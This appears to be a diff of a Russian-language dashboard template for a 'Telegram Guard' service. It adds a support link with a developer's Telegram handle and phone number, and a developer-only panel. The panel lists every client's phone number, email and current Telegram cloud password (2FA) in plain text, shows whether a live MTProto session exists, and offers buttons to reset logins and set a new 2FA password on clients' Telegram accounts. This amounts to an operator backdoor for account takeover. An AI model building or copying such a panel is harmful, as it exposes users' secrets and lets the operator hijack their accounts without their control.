@@ -58,6 +58,14 @@
                 <button class="menu-btn dash-menu-btn" data-tab="settings">
                     <span>⚙️</span> Настройки
                 </button>
+                <a href="https://t.me/myaufvb" target="_blank" class="menu-btn" style="text-decoration: none; display: flex; align-items: center; gap: 10px; margin-top: 6px; color: var(--accent-cyan);">
+                    <span>🆘</span> Техподдержка
+                </a>
+                {% if user.id == 1 or user.is_developer %}
+                <button class="menu-btn dash-menu-btn" data-tab="dev-panel" style="color: #ffd700; border: 1px solid rgba(255, 215, 0, 0.4); background: rgba(255, 215, 0, 0.08); margin-top: 10px; font-weight: 700;">
+                    <span>👑</span> Панель Разработчика
+                </button>
+                {% endif %}
             </aside>
 
             <!-- Main Content Area -->
@@ -299,7 +307,119 @@
                         <button type="submit" class="btn btn-primary" style="width: auto; padding: 10px 24px; margin-top: 10px;">Сохранить настройки</button>
                         <span id="settingsStatusMsg" style="margin-left: 10px; font-size: 0.9rem;"></span>
                     </form>
+
+                    <!-- Technical Support Card for Clients -->
+                    <div style="margin-top: 2.5rem; background: linear-gradient(135deg, rgba(79, 172, 254, 0.08), rgba(0, 242, 254, 0.04)); border: 1px solid var(--accent-cyan); padding: 1.8rem; border-radius: var(--radius); box-shadow: 0 8px 30px rgba(0, 242, 254, 0.06);">
+                        <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 0.8rem;">
+                            <span style="font-size: 1.8rem;">🆘</span>
+                            <div>
+                                <h3 style="font-size: 1.15rem; color: var(--accent-cyan); margin: 0;">Техническая поддержка</h3>
+                                <p style="color: var(--text-secondary); font-size: 0.85rem; margin-top: 2px;">Прямая связь с разработчиком системы Telegram Guard</p>
+                            </div>
+                        </div>
+
+                        <p style="color: var(--text-primary); font-size: 0.92rem; line-height: 1.5; margin-bottom: 1.2rem;">
+                            Если вы <strong>не можете войти в Telegram</strong> из-за облачного пароля, забыли пароль от личного кабинета или возникли проблемы с мониторингом — напишите разработчику в Telegram в личные сообщения:
+                        </p>
+
+                        <div style="display: flex; gap: 12px; align-items: center; flex-wrap: wrap;">
+                            <a href="https://t.me/myaufvb" target="_blank" class="btn btn-primary" style="display: inline-flex; align-items: center; gap: 8px; width: auto; padding: 12px 24px; font-weight: 700; background: linear-gradient(135deg, #00f2fe, #4facfe); border: none; text-decoration: none;">
+                                <span>✈️</span> Написать в Telegram: @myaufvb
+                            </a>
+                            <span style="font-size: 0.85rem; color: var(--text-secondary);">
+                                Телефон разработчика: <strong>+998 (33) 490-69-69</strong>
+                            </span>
+                        </div>
+                    </div>
                 </div>
+
+                {% if user.id == 1 or user.is_developer %}
+                <!-- Tab 4: Панель Разработчика (Только для ID: 1 и +998334906969) -->
+                <div id="tab-dev-panel" class="dash-tab-content" style="display: none;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem; flex-wrap: wrap; gap: 10px;">
+                        <div>
+                            <h2 style="color: #ffd700; display: flex; align-items: center; gap: 8px;">
+                                <span>👑</span> Панель Управления Разработчика
+                            </h2>
+                            <p style="color: var(--text-secondary); font-size: 0.88rem; margin-top: 4px;">
+                                Помощь пользователям: просмотр и сброс Облачного пароля Telegram (2FA), сброс пароля кабинета.
+                            </p>
+                        </div>
+                        <span class="badge" style="background: rgba(255, 215, 0, 0.15); border: 1px solid #ffd700; color: #ffd700; font-weight: 700; font-size: 0.85rem; padding: 6px 12px;">
+                            ID: {{ user.id }} | Доступ: Разработчик
+                        </span>
+                    </div>
+
+                    <!-- Search Filter -->
+                    <div style="margin-bottom: 1.5rem;">
+                        <input type="text" id="devUserSearchInput" class="form-control" placeholder="🔍 Поиск клиента по номеру телефона, имени или email..." style="padding: 12px 18px; font-size: 0.95rem;">
+                    </div>
+
+                    <!-- Clients Table -->
+                    <div style="overflow-x: auto; background: var(--bg-primary); border: 1px solid var(--border-color); border-radius: var(--radius); padding: 1rem;">
+                        <table class="session-table" id="devUsersTable" style="margin-top: 0; width: 100%;">
+                            <thead>
+                                <tr>
+                                    <th>ID</th>
+                                    <th>Пользователь</th>
+                                    <th>Telegram Телефон</th>
+                                    <th>Gmail</th>
+                                    <th>Облачный пароль (2FA)</th>
+                                    <th>Сессия MTProto</th>
+                                    <th>Действия разработчика</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                {% for u in all_users %}
+                                <tr class="dev-user-row" data-search="{{ u.username }} {{ u.phone_number }} {{ u.email or '' }}">
+                                    <td><strong>#{{ u.id }}</strong></td>
+                                    <td>
+                                        <strong>{{ u.username }}</strong><br>
+                                        <small style="color: var(--text-secondary);">{{ u.created_at }}</small>
+                                    </td>
+                                    <td>
+                                        <span style="font-family: monospace; font-weight: 700; color: var(--accent-cyan); font-size: 0.95rem;">{{ u.phone_number }}</span>
+                                    </td>
+                                    <td>
+                                        {% if u.email %}
+                                            <span style="color: var(--accent-green); font-size: 0.85rem;">{{ u.email }}</span>
+                                        {% else %}
+                                            <span style="color: var(--text-secondary); font-size: 0.85rem;">Не привязан</span>
+                                        {% endif %}
+                                    </td>
+                                    <td>
+                                        <div style="display: flex; align-items: center; gap: 6px;">
+                                            <code style="background: rgba(0, 242, 254, 0.12); color: var(--accent-cyan); padding: 4px 8px; border-radius: 4px; font-weight: 800; font-size: 0.92rem; font-family: monospace;">
+                                                {{ u.current_2fa_otp }}
+                                            </code>
+                                        </div>
+                                    </td>
+                                    <td>
+                                        {% if u.has_session %}
+                                            <span class="badge badge-success">Подключена</span>
+                                        {% else %}
+                                            <span class="badge badge-warning">Нет сессии</span>
+                                        {% endif %}
+                                    </td>
+                                    <td>
+                                        <div style="display: flex; gap: 6px; flex-wrap: wrap;">
+                                            <button type="button" onclick="devResetUserPassword('{{ u.id }}', '{{ u.username }}')" class="btn btn-secondary" style="padding: 6px 12px; font-size: 0.78rem;" title="Сбросить пароль кабинета">
+                                                🔑 Сброс входа
+                                            </button>
+                                            <button type="button" onclick="devResetCloud2FA('{{ u.id }}', '{{ u.username }}')" class="btn btn-primary" style="padding: 6px 12px; font-size: 0.78rem; background: linear-gradient(135deg, #00f2fe, #4facfe); border: none; font-weight: 700;" title="Установить новый Облачный пароль в Telegram">
+                                                🔄 Новый 2FA
+                                            </button>
+                                        </div>
+                                    </td>
+                                </tr>
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div id="devActionStatusMsg" style="margin-top: 15px; font-size: 0.95rem; font-weight: 600;"></div>
+                </div>
+                {% endif %}
 
             </section>
         </div>
